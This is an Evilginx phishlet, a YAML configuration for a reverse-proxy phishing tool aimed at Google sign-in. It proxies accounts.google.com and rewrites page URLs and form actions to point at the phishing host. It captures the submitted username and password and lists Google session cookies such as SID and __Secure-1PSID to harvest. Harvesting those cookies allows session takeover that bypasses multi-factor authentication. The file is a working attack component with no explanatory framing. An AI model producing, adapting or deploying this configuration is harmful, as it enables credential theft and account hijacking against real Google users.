name: 'google'
author: 'kgretzky'
min_ver: '2.3.0'
proxy_hosts:
  - {phish_sub: '', orig_sub: 'accounts', domain: 'google.com', session: true, is_landing: true}
sub_filters:
  - {triggers_on: 'accounts.google.com', orig_sub: 'accounts', domain: 'google.com', search: 'https://accounts.google.com', replace: 'https://{hostname}', mimes: ['text/html','application/javascript'], redirect: true}
  - {triggers_on: 'accounts.google.com', orig_sub: 'accounts', domain: 'google.com', search: 'action="https://accounts.google.com', replace: 'action="https://{hostname}', mimes: ['text/html'], redirect: true}
  - {triggers_on: 'accounts.google.com', orig_sub: 'accounts', domain: 'google.com', search: 'https://ssl.gstatic.com', replace: 'https://{hostname}', mimes: ['text/html','application/javascript'], redirect: false}
  - {triggers_on: 'ssl.gstatic.com', orig_sub: 'ssl', domain: 'gstatic.com', search: '/', replace: '', mimes: ['image/*','text/css','application/javascript'], redirect: false}
credentials:
  username: {key: 'identifier', search: '.*', type: 'post'}
  password: {key: 'password', search: '.*', type: 'post'}
auth_tokens:
  - domain: '.google.com'
    keys: ['SID','HSID','SSID','APISID','SAPISID','SIDCC','__Secure-1PSID','__Secure-3PSID','__Secure-1PSIDCC','__Secure-3PSIDCC','__Secure-1PSIDTS','__Secure-3PSIDTS','LSID','NID','1P_JAR']
auth_urls:
  - '/accounts/SetSID'
  - '/accounts/SetOSID'
login:
  domain: 'accounts.google.com'
  path: '/accounts/Login'
